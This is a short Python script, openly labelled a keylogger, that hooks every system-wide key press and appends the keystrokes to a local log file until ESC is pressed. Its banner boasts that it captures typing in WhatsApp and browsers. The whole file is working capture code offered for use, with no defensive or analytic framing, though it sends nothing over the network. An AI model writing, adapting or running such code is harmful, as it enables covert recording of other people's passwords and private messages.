import keyboard
from datetime import datetime

# Configuration
log_file = "keylog_results.txt"

def on_key_event(event):
    """Callback function triggered on every key press."""
    if event.event_type == keyboard.KEY_DOWN:
        key = event.name
        
        # Filtering logic for better readability
        if key == "space":
            output = " "
        elif key == "enter":
            output = "\n[ENTER]\n"
        elif key == "backspace":
            output = "[BACKSPACE]"
        elif len(key) > 1:
            # Captures keys like Shift, Ctrl, Tab in brackets
            output = f"[{key.upper()}]"
        else:
            output = key

        # Save to file
        with open(log_file, "a") as f:
            f.write(output)

# --- Terminal Interface ---
print("==================================================")
print(f"  [+] Keylogger Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print("  [+] Status: CAPTURING KEYS (WhatsApp, Browsers, etc.)")
print("  [!] Press 'ESC' to stop the program safely.")
print("==================================================")

# This hooks the keyboard and waits for 'esc' to be pressed
keyboard.on_press(on_key_event)
keyboard.wait('esc')

print("\n[!] Keylogger stopped successfully. Log saved to:", log_file)